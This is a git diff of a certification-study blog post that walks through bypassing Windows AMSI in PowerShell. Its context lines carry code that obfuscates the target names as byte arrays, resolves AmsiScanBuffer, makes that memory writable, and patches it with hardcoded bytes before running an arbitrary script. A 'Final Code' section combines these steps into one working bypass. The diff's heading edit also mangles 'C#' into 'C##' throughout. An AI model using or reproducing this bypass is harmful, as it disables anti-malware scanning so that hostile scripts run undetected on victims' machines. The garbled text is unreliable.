@@ -2,15 +2,15 @@
 title: Bypass AMSI Like a King
 date: 2024-06-18 05:00:00 +0800
 categories: [Cert, CRTP]
-tags: [Cert, Active Directory]     # TAG names should always be lowercase
+tags: [Cert, Active Directory]     ## TAG names should always be lowercase
 description: Describes how to bypass the Anti-Malware Scan Interface (AMSI) using PowerShell.
 ---
 
-# Summary
+## Summary
 
 This document describes how to bypass the Anti-Malware Scan Interface (AMSI) using PowerShell. It involves loading the `amsi.dll` into memory, finding the memory address of the `AmsiScanBuffer` function, and changing the memory protection to allow writing and executing code. Shellcode is then injected, and a PowerShell script is run. This method is mainly used for cybersecurity research and testing purposes and should be used responsibly.
 
-# 1. Defining a C# Class with PInvoke Methods
+## 1. Defining a C## Class with PInvoke Methods
 
 ```jsx
 $Win32 = @"
@@ -29,11 +29,11 @@ public class Win32 {
 Add-Type $Win32
 ```
 
-In PowerShell, you can't directly call functions from Windows DLLs like `kernel32.dll` or `user32.dll`. These DLLs contain functions written in languages like C or C++. However, you can use a feature called PInvoke (Platform Invocation Services) to call these functions from PowerShell. PInvoke allows managed code (like C#) to call unmanaged functions.
+In PowerShell, you can't directly call functions from Windows DLLs like `kernel32.dll` or `user32.dll`. These DLLs contain functions written in languages like C or C++. However, you can use a feature called PInvoke (Platform Invocation Services) to call these functions from PowerShell. PInvoke allows managed code (like C##) to call unmanaged functions.
 
 **Explanation:**
 
-- This part of the code defines a C# class `Win32` using a here-string (`@" ... "@`) in PowerShell.
+- This part of the code defines a C## class `Win32` using a here-string (`@" ... "@`) in PowerShell.
 - This class contains three methods: `GetProcAddress`, `LoadLibrary`, and `VirtualProtect`.
 - These methods use the `[DllImport]` attribute, which tells the .NET runtime to look for these functions in the specified DLLs (`kernel32.dll` in this case).
 - `GetProcAddress` retrieves the address of an exported function from a DLL.
@@ -42,7 +42,7 @@ In PowerShell, you can't directly call functions from Windows DLLs like `kernel3
 
 ---
 
-# 2. Loading `amsi.dll`
+## 2. Loading `amsi.dll`
 
 ```jsx
 $nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
@@ -60,7 +60,7 @@ The script aims to interact with functions from `amsi.dll`, which is a Windows D
 
 ---
 
-# 3. Getting the Address of `AmsiScanBuffer`
+## 3. Getting the Address of `AmsiScanBuffer`
 
 ```jsx
 $somewhere = [Byte[]](0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
@@ -77,7 +77,7 @@ The script needs to find the memory address of the `AmsiScanBuffer` function ins
 
 ---
 
-# 4. Changing Memory Protection
+## 4. Changing Memory Protection
 
 ```
 $notp = 0
@@ -93,7 +93,7 @@ $replace = 'VirtualProtec'
 
 ---
 
-# 5. Injecting Shellcode
+## 5. Injecting Shellcode
 
 ```
 $stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
@@ -103,7 +103,7 @@ $marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)
 
 ---
 
-# 6. Executing Your PowerShell Script
+## 6. Executing Your PowerShell Script
 
 ```
 Unblock-File -Path .\malas.ps1
@@ -117,7 +117,7 @@ Unblock-File -Path .\malas.ps1
 
 ---
 
-# 7. Final Code
+## 7. Final Code
 
 ```jsx
 $c = 't'
@@ -145,7 +145,7 @@ $marshalClass = [System.Runtime.InteropServices.Marshal]
 $marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)
 ```
 
-# 8. Run you powershell script
+## 8. Run you powershell script
 
 ```jsx
 Run your powershell here
